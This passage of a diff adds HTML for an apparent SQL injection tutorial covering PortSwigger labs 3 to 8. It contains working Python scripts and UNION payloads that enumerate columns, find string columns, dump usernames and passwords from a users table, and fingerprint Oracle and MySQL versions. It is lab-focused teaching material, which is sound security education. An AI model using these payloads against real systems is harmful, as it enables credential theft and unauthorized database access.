+          <span class="normal">SELECT ... WHERE category='Gifts'</span><span class="injected">'+ORDER+BY+3--</span>  ← <span style="color:#ff6b6b">500 error → 2 columns exist</span>
+        </div>
+
+        <h3>The script</h3>
+        <div class="code-block">
+          <div class="code-block-header">
+            <span class="code-block-lang">python</span>
+            <span class="code-block-label">Lab3.py</span>
+            <button class="copy-btn" onclick="copyCode(this)">copy</button>
+          </div>
+          <pre><code><span class="kw">import</span> requests
+<span class="kw">import</span> sys
+<span class="kw">import</span> urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies <span class="op">=</span> {<span class="str">'http'</span>: <span class="str">'http://127.0.0.1:8080'</span>, <span class="str">'https'</span>: <span class="str">'http://127.0.0.1:8080'</span>}
+
+<span class="kw">def</span> <span class="fn">exploit_sqli_column_number</span>(url):
+    path <span class="op">=</span> <span class="str">"filter?category=Gifts"</span>
+    <span class="kw">for</span> i <span class="kw">in</span> <span class="fn">range</span>(<span class="num">1</span>, <span class="num">50</span>):
+        payload <span class="op">=</span> <span class="str">"'+order+by+%s--"</span> <span class="op">%</span> i
+        r <span class="op">=</span> requests.<span class="fn">get</span>(url <span class="op">+</span> path <span class="op">+</span> payload, verify<span class="op">=</span><span class="kw">False</span>, proxies<span class="op">=</span>proxies)
+        <span class="kw">if</span> <span class="str">"Internal Server Error"</span> <span class="kw">in</span> r.text:
+            <span class="kw">return</span> i <span class="op">-</span> <span class="num">1</span>
+    <span class="kw">return</span> <span class="kw">False</span>
+
+<span class="kw">if</span> __name__ <span class="op">==</span> <span class="str">"__main__"</span>:
+    <span class="kw">try</span>:
+        url <span class="op">=</span> sys.argv[<span class="num">1</span>].strip()
+    <span class="kw">except</span> <span class="cls">IndexError</span>:
+        <span class="fn">print</span>(<span class="str">"[-] Example: %s www.example.com"</span> <span class="op">%</span> sys.argv[<span class="num">0</span>])
+        sys.<span class="fn">exit</span>(<span class="op">-</span><span class="num">1</span>)
+
+    <span class="fn">print</span>(<span class="str">"[+] Figuring out number of columns..."</span>)
+    num_col <span class="op">=</span> <span class="fn">exploit_sqli_column_number</span>(url)
+    <span class="kw">if</span> num_col:
+        <span class="fn">print</span>(<span class="str">"[+] The number of columns is "</span> <span class="op">+</span> <span class="fn">str</span>(num_col) <span class="op">+</span> <span class="str">"."</span>)
+    <span class="kw">else</span>:
+        <span class="fn">print</span>(<span class="str">"[-] The SQLi attack was not successful."</span>)</code></pre>
+        </div>
+
+        <div class="code-block">
+          <div class="code-block-header">
+            <span class="code-block-lang">bash</span>
+            <span class="code-block-label">usage</span>
+          </div>
+          <pre><code>python Lab3.py https://&lt;lab-id&gt;.web-security-academy.net/</code></pre>
+        </div>
+
+        <h3>Script breakdown</h3>
+        <table class="breakdown">
+          <tr><th>line / concept</th><th>what it does and why</th></tr>
+          <tr>
+            <td>range(1, 50)</td>
+            <td>Tries ORDER BY 1 through ORDER BY 49. 50 is a safe upper bound — real queries rarely return more than 10–15 columns, but giving it headroom avoids edge cases.</td>
+          </tr>
+          <tr>
+            <td>"'+order+by+%s--" % i</td>
+            <td>The <code>%s</code> is Python's old-style string formatting — inserts the integer <code>i</code>. The <code>+</code> signs are URL-encoded spaces. Some servers require proper URL encoding; others accept literal spaces. Using <code>+</code> is safe for both.</td>
+          </tr>
+          <tr>
+            <td>"Internal Server Error" in r.text</td>
+            <td>When ORDER BY exceeds the column count, the database throws an error and the app returns a 500. That's our signal — and the answer is <code>i - 1</code> (the last value that worked).</td>
+          </tr>
+          <tr>
+            <td>return i - 1</td>
+            <td>We want the last <em>successful</em> column index, not the index that broke it. Since we detected failure at <code>i</code>, the count is <code>i - 1</code>.</td>
+          </tr>
+        </table>
+
+        <div class="callout warning">
+          <div class="callout-title">⚠️ Note on the path concat</div>
+          <p>There's a subtle bug in the script: <code>url + path + payload</code> — if <code>url</code> doesn't end with <code>/</code>, this becomes <code>https://example.comfilter?...</code>. Add a trailing slash to your URL argument, or fix it in the code with <code>url.rstrip('/') + '/' + path + payload</code>.</p>
+        </div>
+
+        <div class="lab-takeaway">
+          <div class="takeaway-icon">🧠</div>
+          <div>
+            <div class="takeaway-title">What this lab teaches</div>
+            <div class="takeaway-text">Column count enumeration is always step one of a UNION attack. The ORDER BY technique is cleaner than trying UNION NULL combinations because a single incrementing loop is enough — you don't need to try every possible column count combination. This exact loop is a building block you'll reuse in the next labs.</div>
+          </div>
+        </div>
+      </div>
+
+      <hr class="lab-divider" />
+
+      <!-- ═══════════════════ LAB 4 ═══════════════════ -->
+      <div class="lab-section" id="lab4">
+        <div class="lab-header">
+          <div class="lab-num">04</div>
+          <div class="lab-header-text">
+            <div class="lab-title-row">
+              <span class="lab-difficulty diff-practitioner">Practitioner</span>
+            </div>
+            <h2 class="lab-title">UNION Attack — Finding a Column with String Data Type</h2>
+            <div class="lab-goal">Goal: <span>Identify which column in the query accepts string data, so we can inject text into the output</span></div>
+          </div>
+        </div>
+
+        <h3>Why data types matter</h3>
+        <p>
+          Knowing the column count isn't enough on its own. For UNION-based data exfiltration, we need to inject a string value into the response — but SQL requires that each column in a UNION has compatible types. A column that holds integers will throw an error if you try to inject a string into it.
+        </p>
+        <p>
+          The approach: try a UNION SELECT with a known test string in each column position, one at a time, while filling the others with <code>NULL</code> (which is type-compatible with anything). When the test string appears in the response, we've found our string column.
+        </p>
+        <div class="vuln-query">
+          <span class="label">probing — 3 columns, testing each position</span>
+          <span class="normal">UNION SELECT </span><span class="injected">'v2F6UA'</span><span class="normal">, NULL, NULL--</span>  ← check response
+          <br/>
+          <span class="normal">UNION SELECT NULL, </span><span class="injected">'v2F6UA'</span><span class="normal">, NULL--</span>  ← check response
+          <br/>
+          <span class="normal">UNION SELECT NULL, NULL, </span><span class="injected">'v2F6UA'</span><span class="normal">--</span>  ← <span style="color:#5dffb2">string appears → column 3 is a string type</span>
+        </div>
+
+        <h3>The script</h3>
+        <div class="code-block">
+          <div class="code-block-header">
+            <span class="code-block-lang">python</span>
+            <span class="code-block-label">Lab4.py</span>
+            <button class="copy-btn" onclick="copyCode(this)">copy</button>
+          </div>
+          <pre><code><span class="kw">import</span> requests
+<span class="kw">import</span> sys
+<span class="kw">import</span> urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies <span class="op">=</span> {<span class="str">'http'</span>: <span class="str">'http://127.0.0.1:8080'</span>, <span class="str">'https'</span>: <span class="str">'http://127.0.0.1:8080'</span>}
+
+<span class="kw">def</span> <span class="fn">exploit_sqli_column_number</span>(url):
+    path <span class="op">=</span> <span class="str">"filter?category=Gifts"</span>
+    <span class="kw">for</span> i <span class="kw">in</span> <span class="fn">range</span>(<span class="num">1</span>, <span class="num">50</span>):
+        sql_payload <span class="op">=</span> <span class="str">"'+order+by+%s--"</span> <span class="op">%</span> i
+        r <span class="op">=</span> requests.<span class="fn">get</span>(url <span class="op">+</span> path <span class="op">+</span> sql_payload, verify<span class="op">=</span><span class="kw">False</span>, proxies<span class="op">=</span>proxies)
+        <span class="kw">if</span> <span class="str">"Internal Server Error"</span> <span class="kw">in</span> r.text:
+            <span class="kw">return</span> i <span class="op">-</span> <span class="num">1</span>
+    <span class="kw">return</span> <span class="kw">False</span>
+
+<span class="kw">def</span> <span class="fn">exploit_sqli_string_field</span>(url, num_col):
+    path <span class="op">=</span> <span class="str">"filter?category=Gifts"</span>
+    <span class="kw">for</span> i <span class="kw">in</span> <span class="fn">range</span>(<span class="num">1</span>, num_col <span class="op">+</span> <span class="num">1</span>):
+        string <span class="op">=</span> <span class="str">"'v2F6UA'"</span>
+        payload_list <span class="op">=</span> [<span class="str">'null'</span>] <span class="op">*</span> num_col
+        payload_list[i <span class="op">-</span> <span class="num">1</span>] <span class="op">=</span> string
+        sql_payload <span class="op">=</span> <span class="str">"' union select "</span> <span class="op">+</span> <span class="str">','</span>.<span class="fn">join</span>(payload_list) <span class="op">+</span> <span class="str">"--"</span>
+        r <span class="op">=</span> requests.<span class="fn">get</span>(url <span class="op">+</span> path <span class="op">+</span> sql_payload, verify<span class="op">=</span><span class="kw">False</span>, proxies<span class="op">=</span>proxies)
+        <span class="kw">if</span> string.strip(<span class="str">'\''</span>) <span class="kw">in</span> r.text:
+            <span class="kw">return</span> i
+    <span class="kw">return</span> <span class="kw">False</span>
+
+<span class="kw">if</span> __name__ <span class="op">==</span> <span class="str">"__main__"</span>:
+    <span class="kw">try</span>:
+        url <span class="op">=</span> sys.argv[<span class="num">1</span>].strip()
+    <span class="kw">except</span> <span class="cls">IndexError</span>:
+        <span class="fn">print</span>(<span class="str">"[-] Usage: %s &lt;url&gt;"</span> <span class="op">%</span> sys.argv[<span class="num">0</span>])
+        sys.<span class="fn">exit</span>(<span class="op">-</span><span class="num">1</span>)
+
+    <span class="fn">print</span>(<span class="str">"[+] Figuring out number of columns..."</span>)
+    num_col <span class="op">=</span> <span class="fn">exploit_sqli_column_number</span>(url)
+    <span class="kw">if</span> num_col:
+        <span class="fn">print</span>(<span class="str">"[+] The number of columns is "</span> <span class="op">+</span> <span class="fn">str</span>(num_col) <span class="op">+</span> <span class="str">"."</span>)
+        <span class="fn">print</span>(<span class="str">"[+] Figuring out which column contains text..."</span>)
+        string_column <span class="op">=</span> <span class="fn">exploit_sqli_string_field</span>(url, num_col)
+        <span class="kw">if</span> string_column:
+            <span class="fn">print</span>(<span class="str">"[+] The column that contains text is "</span> <span class="op">+</span> <span class="fn">str</span>(string_column) <span class="op">+</span> <span class="str">"."</span>)
+        <span class="kw">else</span>:
+            <span class="fn">print</span>(<span class="str">"[-] Could not find a string-type column."</span>)
+    <span class="kw">else</span>:
+        <span class="fn">print</span>(<span class="str">"[-] The SQLi attack was not successful."</span>)</code></pre>
+        </div>
+
+        <div class="code-block">
+          <div class="code-block-header">
+            <span class="code-block-lang">bash</span>
+            <span class="code-block-label">usage</span>
+          </div>
+          <pre><code>python Lab4.py https://&lt;lab-id&gt;.web-security-academy.net/</code></pre>
+        </div>
+
+        <h3>Script breakdown</h3>
+        <table class="breakdown">
+          <tr><th>line / concept</th><th>what it does and why</th></tr>
+          <tr>
+            <td>payload_list = ['null'] * num_col</td>
+            <td>Creates a list of <code>null</code> values with the same length as the column count. For example, if there are 3 columns: <code>['null', 'null', 'null']</code>. NULL is SQL's universal type placeholder — compatible with any column type.</td>
+          </tr>
+          <tr>
+            <td>payload_list[i-1] = string</td>
+            <td>Replaces one null with the test string at position <code>i-1</code>. The loop iterates through every column position systematically. The <code>-1</code> is because the SQL column indices are 1-based but Python lists are 0-based.</td>
+          </tr>
+          <tr>
+            <td>"' union select " + ','.join(payload_list) + "--"</td>
+            <td>Assembles the final payload. <code>','.join()</code> converts the list to a comma-separated string. Result looks like: <code>' union select null,'v2F6UA',null--</code></td>
+          </tr>
+          <tr>
+            <td>string.strip('\'')</td>
+            <td>Strips the surrounding single quotes from <code>'v2F6UA'</code> to get just <code>v2F6UA</code>. We check for the bare value in the response — the SQL quotes won't appear in the rendered HTML output.</td>
+          </tr>
+          <tr>
+            <td>Two-phase design</td>
+            <td>Lab 4 builds directly on Lab 3 — it reuses the exact column-count function and adds the string-field detection on top. This is the right pattern: each piece of recon feeds the next step.</td>
+          </tr>
+        </table>
+
+        <div class="lab-takeaway">
+          <div class="takeaway-icon">🧠</div>
+          <div>
+            <div class="takeaway-title">What this lab teaches</div>
+            <div class="takeaway-text">Once you have the column count and a confirmed string column, you have everything needed to pull actual data from the database. Labs 5+ will use this exact foundation to extract table names, usernames, and passwords. The test string <code>v2F6UA</code> is arbitrary — just something distinctive enough that it won't appear in normal page content, so there are no false positives.</div>
+          </div>
+        </div>
+      </div>
+
+      <hr class="lab-divider" />
+
+      <!-- ═══════════════════ LAB 5 ═══════════════════ -->
+      <div class="lab-section" id="lab5">
+        <div class="lab-header">
+          <div class="lab-num">05</div>
+          <div class="lab-header-text">
+            <div class="lab-title-row">
+              <span class="lab-difficulty diff-practitioner">Practitioner</span>
+            </div>
+            <h2 class="lab-title">UNION Attack — Retrieving Data from Other Tables</h2>
+            <div class="lab-goal">Goal: <span>Use a UNION-based injection to pull usernames and passwords from a <code>users</code> table and log in as administrator</span></div>
+          </div>
+        </div>
+
+        <h3>What's happening</h3>
+        <p>
+          This is where the UNION technique pays off. You've already enumerated columns and identified a string-typed one — now you can directly exfiltrate real data. The application builds its query around a category filter, but by appending a UNION SELECT we can bolt on a second query that reads from any table we want, including the <code>users</code> table.
+        </p>
+        <p>
+          The key insight here is that SQL's UNION operator simply stacks result sets vertically. As long as the injected SELECT returns the same number of columns (with compatible types), its rows are appended to the original results and rendered in the page like any other product row.
+        </p>
+        <div class="vuln-query">
+          <span class="label">final payload</span>
+          <span class="normal">SELECT ... FROM products WHERE category='Gifts'</span>
+          <br/>
+          <span class="injected">UNION SELECT username, password FROM users--</span>
+        </div>
+        <p>
+          The application then renders both the normal products <em>and</em> all rows from the <code>users</code> table. We parse the response HTML to find the cell next to "administrator" — that's the password.
+        </p>
+
+        <div class="callout info">
+          <div class="callout-title">ℹ️ Why we know the table is called "users"</div>
+          <p>For this Apprentice-level lab, PortSwigger tells you the table and column names in the lab description. In real engagements and later labs, you'd enumerate these from <code>information_schema.tables</code> first — which Labs 9 and 10 cover.</p>
+        </div>
+
+        <h3>The script</h3>
+        <div class="code-block">
+          <div class="code-block-header">
+            <span class="code-block-lang">python</span>
+            <span class="code-block-label">sqli-lab-05.py</span>
+            <button class="copy-btn" onclick="copyCode(this)">copy</button>
+          </div>
+          <pre><code><span class="kw">import</span> requests
+<span class="kw">import</span> sys
+<span class="kw">import</span> urllib3
+<span class="kw">from</span> bs4 <span class="kw">import</span> BeautifulSoup
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies <span class="op">=</span> {<span class="str">'http'</span>: <span class="str">'http://127.0.0.1:8080'</span>, <span class="str">'https'</span>: <span class="str">'http://127.0.0.1:8080'</span>}
+
+<span class="kw">def</span> <span class="fn">exploit_sqli_users_table</span>(url):
+    path <span class="op">=</span> <span class="str">'/filter?category=Gifts'</span>
+    sql_payload <span class="op">=</span> <span class="str">"' UNION select username, password from users--"</span>
+    r <span class="op">=</span> requests.<span class="fn">get</span>(url <span class="op">+</span> path <span class="op">+</span> sql_payload, verify<span class="op">=</span><span class="kw">False</span>, proxies<span class="op">=</span>proxies)
+    <span class="kw">if</span> <span class="str">"administrator"</span> <span class="kw">in</span> r.text:
+        <span class="fn">print</span>(<span class="str">"[+] Found the administrator password."</span>)
+        soup <span class="op">=</span> <span class="cls">BeautifulSoup</span>(r.text, <span class="str">'html.parser'</span>)
+        admin_password <span class="op">=</span> soup.body.<span class="fn">find</span>(text<span class="op">=</span><span class="str">"administrator"</span>).parent.<span class="fn">findNext</span>(<span class="str">'td'</span>).contents[<span class="num">0</span>]
+        <span class="fn">print</span>(<span class="str">"[+] The administrator password is '%s'"</span> <span class="op">%</span> admin_password)
+        <span class="kw">return</span> <span class="kw">True</span>
+    <span class="kw">return</span> <span class="kw">False</span>
+
+<span class="kw">if</span> __name__ <span class="op">==</span> <span class="str">"__main__"</span>:
+    <span class="kw">try</span>:
+        url <span class="op">=</span> sys.argv[<span class="num">1</span>].strip()
+    <span class="kw">except</span> <span class="cls">IndexError</span>:
+        <span class="fn">print</span>(<span class="str">"[-] Usage: %s &lt;url&gt;"</span> <span class="op">%</span> sys.argv[<span class="num">0</span>])
+        sys.<span class="fn">exit</span>(<span class="op">-</span><span class="num">1</span>)
+
+    <span class="fn">print</span>(<span class="str">"[+] Dumping the list of usernames and passwords..."</span>)
+    <span class="kw">if not</span> <span class="fn">exploit_sqli_users_table</span>(url):
+        <span class="fn">print</span>(<span class="str">"[-] Did not find an administrator password."</span>)</code></pre>
+        </div>
+
+        <div class="code-block">
+          <div class="code-block-header">
+            <span class="code-block-lang">bash</span>
+            <span class="code-block-label">usage</span>
+          </div>
+          <pre><code>python sqli-lab-05.py https://&lt;lab-id&gt;.web-security-academy.net/</code></pre>
+        </div>
+
+        <h3>Script breakdown</h3>
+        <table class="breakdown">
+          <tr><th>line / concept</th><th>what it does and why</th></tr>
+          <tr>
+            <td>UNION select username, password from users</td>
+            <td>This works because the original query returns exactly 2 columns. The UNION appends all rows from <code>users</code> to the product listing. Both columns are strings, satisfying the type compatibility requirement.</td>
+          </tr>
+          <tr>
+            <td>soup.body.find(text="administrator")</td>
+            <td>Finds the exact text node "administrator" in the rendered HTML. BeautifulSoup's <code>find(text=...)</code> returns the NavigableString itself — you then navigate to its parent element and look at the next sibling <code>&lt;td&gt;</code> for the password.</td>
+          </tr>
+          <tr>
+            <td>.parent.findNext('td').contents[0]</td>
+            <td>The username and password are adjacent table cells. <code>findNext('td')</code> walks to the immediately following cell — <code>.contents[0]</code> extracts the raw text from it.</td>
+          </tr>
+        </table>
+
+        <div class="lab-takeaway">
+          <div class="takeaway-icon">🧠</div>
+          <div>
+            <div class="takeaway-title">What this lab teaches</div>
+            <div class="takeaway-text">Once you have column count and a string column, UNION-based exfil is straightforward: just replace the test string with the columns you actually want. The parse logic (navigating sibling table cells) is also a useful pattern you'll see repeatedly — the response structure is consistent once you know what you injected.</div>
+          </div>
+        </div>
+      </div>
+
+      <hr class="lab-divider" />
+
+      <!-- ═══════════════════ LAB 6 ═══════════════════ -->
+      <div class="lab-section" id="lab6">
+        <div class="lab-header">
+          <div class="lab-num">06</div>
+          <div class="lab-header-text">
+            <div class="lab-title-row">
+              <span class="lab-difficulty diff-practitioner">Practitioner</span>
+            </div>
+            <h2 class="lab-title">UNION Attack — Retrieving Multiple Values in a Single Column</h2>
+            <div class="lab-goal">Goal: <span>Extract both username and password into a single column using string concatenation when only one column accepts string data</span></div>
+          </div>
+        </div>
+
+        <h3>The problem: only one usable column</h3>
+        <p>
+          Sometimes the query returns multiple columns but only one of them is a string type — or you only have one string column available to inject into. You can't pull username into a text column and password into an integer column — that would cause a type error.
+        </p>
+        <p>
+          The solution is <strong>string concatenation</strong>: merge both values into a single string with a separator character you can split on later. PostgreSQL uses the <code>||</code> operator for this. By injecting <code>username || '*' || password</code>, both fields are returned as one string like <code>administrator*s3cr3tp4ss</code>, then we split on <code>*</code> to extract the password.
+        </p>
+        <div class="vuln-query">
+          <span class="label">concat payload (PostgreSQL syntax)</span>
+          <span class="injected">UNION SELECT NULL, username || '*' || password FROM users--</span>
+          <br/>
+          <span class="normal" style="color:#5dffb2">→ renders: administrator*s3cr3tp4ss</span>
+        </div>
+
+        <div class="callout warning">
+          <div class="callout-title">⚠️ Separator choice matters</div>
+          <p>The separator must be a character that won't appear naturally in either the username or password. A <code>~</code> or <code>|</code> usually works. Using <code>*</code> is risky if passwords are allowed to contain it — the split would produce unexpected results.</p>
+        </div>
+
+        <h3>The script</h3>
+        <div class="code-block">
+          <div class="code-block-header">
+            <span class="code-block-lang">python</span>
+            <span class="code-block-label">sqli-lab-06.py</span>
+            <button class="copy-btn" onclick="copyCode(this)">copy</button>
+          </div>
+          <pre><code><span class="kw">import</span> requests
+<span class="kw">import</span> sys
+<span class="kw">import</span> urllib3
+<span class="kw">from</span> bs4 <span class="kw">import</span> BeautifulSoup
+<span class="kw">import</span> re
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies <span class="op">=</span> {<span class="str">'http'</span>: <span class="str">'http://127.0.0.1:8080'</span>, <span class="str">'https'</span>: <span class="str">'http://127.0.0.1:8080'</span>}
+
+<span class="kw">def</span> <span class="fn">exploit_sqli_users_table</span>(url):
+    path <span class="op">=</span> <span class="str">'/filter?category=Pets'</span>
+    sql_payload <span class="op">=</span> <span class="str">"' UNION select NULL, username || '*' || password from users--"</span>
+    r <span class="op">=</span> requests.<span class="fn">get</span>(url <span class="op">+</span> path <span class="op">+</span> sql_payload, verify<span class="op">=</span><span class="kw">False</span>, proxies<span class="op">=</span>proxies)
+    <span class="kw">if</span> <span class="str">"administrator"</span> <span class="kw">in</span> r.text:
+        <span class="fn">print</span>(<span class="str">"[+] Found the administrator password..."</span>)
+        soup <span class="op">=</span> <span class="cls">BeautifulSoup</span>(r.text, <span class="str">'html.parser'</span>)
+        admin_password <span class="op">=</span> soup.<span class="fn">find</span>(text<span class="op">=</span>re.<span class="fn">compile</span>(<span class="str">'.*administrator.*'</span>)).<span class="fn">split</span>(<span class="str">"*"</span>)[<span class="num">1</span>]
+        <span class="fn">print</span>(<span class="str">"[+] The administrator password is '%s'."</span> <span class="op">%</span> admin_password)
+        <span class="kw">return</span> <span class="kw">True</span>
+    <span class="kw">return</span> <span class="kw">False</span>
+
+<span class="kw">if</span> __name__ <span class="op">==</span> <span class="str">"__main__"</span>:
+    <span class="kw">try</span>:
+        url <span class="op">=</span> sys.argv[<span class="num">1</span>].strip()
+    <span class="kw">except</span> <span class="cls">IndexError</span>:
+        <span class="fn">print</span>(<span class="str">"[-] Usage: %s &lt;url&gt;"</span> <span class="op">%</span> sys.argv[<span class="num">0</span>])
+        sys.<span class="fn">exit</span>(<span class="op">-</span><span class="num">1</span>)
+
+    <span class="fn">print</span>(<span class="str">"[+] Dumping the list of usernames and passwords..."</span>)
+    <span class="kw">if not</span> <span class="fn">exploit_sqli_users_table</span>(url):
+        <span class="fn">print</span>(<span class="str">"[-] Did not find an administrator password."</span>)</code></pre>
+        </div>
+
+        <div class="code-block">
+          <div class="code-block-header">
+            <span class="code-block-lang">bash</span>
+            <span class="code-block-label">usage</span>
+          </div>
+          <pre><code>python sqli-lab-06.py https://&lt;lab-id&gt;.web-security-academy.net/</code></pre>
+        </div>
+
+        <h3>Script breakdown</h3>
+        <table class="breakdown">
+          <tr><th>line / concept</th><th>what it does and why</th></tr>
+          <tr>
+            <td>username || '*' || password</td>
+            <td>PostgreSQL's string concatenation operator. Merges three strings: the username, a literal asterisk separator, and the password. Other databases use different syntax — MySQL uses <code>CONCAT(a, '*', b)</code>, MSSQL uses <code>a + '*' + b</code>.</td>
+          </tr>
+          <tr>
+            <td>re.compile('.*administrator.*')</td>
+            <td>A regex-based text search that finds any HTML text node containing the word "administrator". We need regex here because the text is <code>administrator*password</code> — not the bare word — so an exact match would fail.</td>
+          </tr>
+          <tr>
+            <td>.split("*")[1]</td>
+            <td>Splits on the separator we injected and takes index [1] — that's everything after the first <code>*</code>, which is the password. Index [0] would be "administrator".</td>
+          </tr>
+          <tr>
+            <td>NULL in first position</td>
+            <td>The query has 2 columns. The first is not a string type (or we don't need it), so we fill it with NULL. The concatenated credentials go in column 2 — the one we confirmed accepts strings in Lab 4.</td>
+          </tr>
+        </table>
+
+        <div class="lab-takeaway">
+          <div class="takeaway-icon">🧠</div>
+          <div>
+            <div class="takeaway-title">What this lab teaches</div>
+            <div class="takeaway-text">String concatenation is one of the most important UNION techniques for real engagements — real queries often have only one usable string column. Knowing the correct concat syntax for each database type (PostgreSQL <code>||</code>, MySQL <code>CONCAT()</code>, MSSQL <code>+</code>, Oracle <code>||</code>) is therefore part of your fingerprinting checklist.</div>
+          </div>
+        </div>
+      </div>
+
+      <hr class="lab-divider" />
+
+      <!-- ═══════════════════ LAB 7 ═══════════════════ -->
+      <div class="lab-section" id="lab7">
+        <div class="lab-header">
+          <div class="lab-num">07</div>
+          <div class="lab-header-text">
+            <div class="lab-title-row">
+              <span class="lab-difficulty diff-practitioner">Practitioner</span>
+            </div>
+            <h2 class="lab-title">SQL Injection — Querying the Database Type (Oracle)</h2>
+            <div class="lab-goal">Goal: <span>Identify the database version by reading Oracle's <code>v$version</code> banner via a UNION injection</span></div>
+          </div>
+        </div>
+
+        <h3>Why database fingerprinting matters</h3>
+        <p>
+          Different databases have different syntax, different system tables, different functions. Before you can reliably exploit anything beyond the most basic injections, you need to know which database you're talking to. Fingerprinting tells you which techniques apply and which don't.
+        </p>
+        <p>
+          On Oracle specifically, there are two things that differ from other databases that are immediately relevant to UNION attacks. First, Oracle does not allow a SELECT statement without a FROM clause — you always need <code>FROM dual</code> as a placeholder table when selecting constants. Second, the version information lives in a special view called <code>v$version</code>, not in <code>information_schema</code> like MySQL or PostgreSQL.
+        </p>
+        <div class="vuln-query">
+          <span class="label">Oracle version query via UNION</span>
+          <span class="injected">UNION SELECT banner, NULL FROM v$version--</span>
+          <br/>
+          <span class="normal" style="color:#5dffb2">→ Oracle Database 19c Enterprise Edition Release 19.0.0.0.0</span>
+        </div>
+
+        <div class="callout info">
+          <div class="callout-title">ℹ️ Oracle quirk: FROM dual</div>
+          <p>In Oracle, even <code>SELECT 'test', NULL</code> needs a FROM clause: <code>SELECT 'test', NULL FROM dual</code>. <code>dual</code> is a built-in one-row dummy table that exists specifically for this purpose. Forgetting it produces an error that can tip you off that you're dealing with Oracle before you even look at the version string.</p>
+        </div>
+
+        <h3>The script</h3>
+        <div class="code-block">
+          <div class="code-block-header">
+            <span class="code-block-lang">python</span>
+            <span class="code-block-label">sqli-lab-07.py</span>
+            <button class="copy-btn" onclick="copyCode(this)">copy</button>
+          </div>
+          <pre><code><span class="kw">import</span> requests
+<span class="kw">import</span> sys
+<span class="kw">import</span> urllib3
+<span class="kw">from</span> bs4 <span class="kw">import</span> BeautifulSoup
+<span class="kw">import</span> re
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies <span class="op">=</span> {<span class="str">'http'</span>: <span class="str">'http://127.0.0.1:8080'</span>, <span class="str">'https'</span>: <span class="str">'http://127.0.0.1:8080'</span>}
+
+<span class="kw">def</span> <span class="fn">exploit_sqli_version</span>(url):
+    path <span class="op">=</span> <span class="str">"/filter?category=Gifts"</span>
+    sql_payload <span class="op">=</span> <span class="str">"' UNION SELECT banner, NULL from v$version--"</span>
+    r <span class="op">=</span> requests.<span class="fn">get</span>(url <span class="op">+</span> path <span class="op">+</span> sql_payload, verify<span class="op">=</span><span class="kw">False</span>, proxies<span class="op">=</span>proxies)
+    <span class="kw">if</span> <span class="str">"Oracle Database"</span> <span class="kw">in</span> r.text:
+        <span class="fn">print</span>(<span class="str">"[+] Found the database version."</span>)
+        soup <span class="op">=</span> <span class="cls">BeautifulSoup</span>(r.text, <span class="str">'html.parser'</span>)
+        version <span class="op">=</span> soup.<span class="fn">find</span>(text<span class="op">=</span>re.<span class="fn">compile</span>(<span class="str">'.*Oracle\sDatabase.*'</span>))
+        <span class="fn">print</span>(<span class="str">"[+] The Oracle database version is: "</span> <span class="op">+</span> version)
+        <span class="kw">return</span> <span class="kw">True</span>
+    <span class="kw">return</span> <span class="kw">False</span>
+
+<span class="kw">if</span> __name__ <span class="op">==</span> <span class="str">"__main__"</span>:
+    <span class="kw">try</span>:
+        url <span class="op">=</span> sys.argv[<span class="num">1</span>].strip()
+    <span class="kw">except</span> <span class="cls">IndexError</span>:
+        <span class="fn">print</span>(<span class="str">"[-] Usage: %s &lt;url&gt;"</span> <span class="op">%</span> sys.argv[<span class="num">0</span>])
+        sys.<span class="fn">exit</span>(<span class="op">-</span><span class="num">1</span>)
+
+    <span class="fn">print</span>(<span class="str">"[+] Dumping the version of the database..."</span>)
+    <span class="kw">if not</span> <span class="fn">exploit_sqli_version</span>(url):
+        <span class="fn">print</span>(<span class="str">"[-] Unable to dump the database version."</span>)</code></pre>
+        </div>
+
+        <div class="code-block">
+          <div class="code-block-header">
+            <span class="code-block-lang">bash</span>
+            <span class="code-block-label">usage</span>
+          </div>
+          <pre><code>python sqli-lab-07.py https://&lt;lab-id&gt;.web-security-academy.net/</code></pre>
+        </div>
+
+        <h3>Script breakdown</h3>
+        <table class="breakdown">
+          <tr><th>line / concept</th><th>what it does and why</th></tr>
+          <tr>
+            <td>v$version</td>
+            <td>Oracle's built-in view that exposes version and component information. It returns multiple rows — one per component — so the UNION will append all of them to the response. We only care about the row that starts with "Oracle Database".</td>
+          </tr>
+          <tr>
+            <td>"Oracle Database" in r.text</td>
+            <td>Fast pre-check — if this string appears anywhere in the response we know the UNION hit v$version successfully. Only then do we bother parsing the HTML in detail.</td>
+          </tr>
+          <tr>
+            <td>re.compile('.*Oracle\sDatabase.*')</td>
+            <td>The <code>\s</code> matches the space between "Oracle" and "Database". The <code>.*</code> on both sides allows for leading/trailing content in the text node (like surrounding table markup fragments).</td>
+          </tr>
+        </table>
+
+        <div class="lab-takeaway">
+          <div class="takeaway-icon">🧠</div>
+          <div>
+            <div class="takeaway-title">What this lab teaches</div>
+            <div class="takeaway-text">Oracle differs from MySQL/PostgreSQL in two important ways for injection: it requires <code>FROM dual</code> for constant selects, and version info comes from <code>v$version</code> not <code>@@version</code>. Recognizing these quirks early lets you adapt your payloads before wasting time with syntax that won't work. Lab 8 covers the MySQL/MSSQL equivalent.</div>
+          </div>
+        </div>
+      </div>
+
+      <hr class="lab-divider" />
+
+      <!-- ═══════════════════ LAB 8 ═══════════════════ -->
+      <div class="lab-section" id="lab8">
+        <div class="lab-header">
+          <div class="lab-num">08</div>
+          <div class="lab-header-text">
+            <div class="lab-title-row">
+              <span class="lab-difficulty diff-practitioner">Practitioner</span>
+            </div>
+            <h2 class="lab-title">SQL Injection — Querying the Database Type (MySQL / MSSQL)</h2>
+            <div class="lab-goal">Goal: <span>Extract the MySQL or MSSQL database version via UNION using <code>@@version</code></span></div>
+          </div>
+        </div>
+
+        <h3>What's different from Oracle</h3>
+        <p>
+          MySQL and Microsoft SQL Server share the <code>@@version</code> global variable which returns the full version string in one shot. Unlike Oracle, there's no need for a special view or a FROM clause. The comment syntax also differs: MySQL uses <code>#</code> or <code>-- </code> (note the trailing space), while Oracle and PostgreSQL use <code>--</code>.
+        </p>
+        <p>
+          In this lab the URL-encoded <code>%23</code> is used instead of <code>--</code> to comment out the rest of the query — <code>%23</code> is the URL encoding for <code>#</code>, which is MySQL's inline comment character. This works in cases where <code>--</code> gets stripped by a WAF or the application layer.
+        </p>
+        <div class="vuln-query">
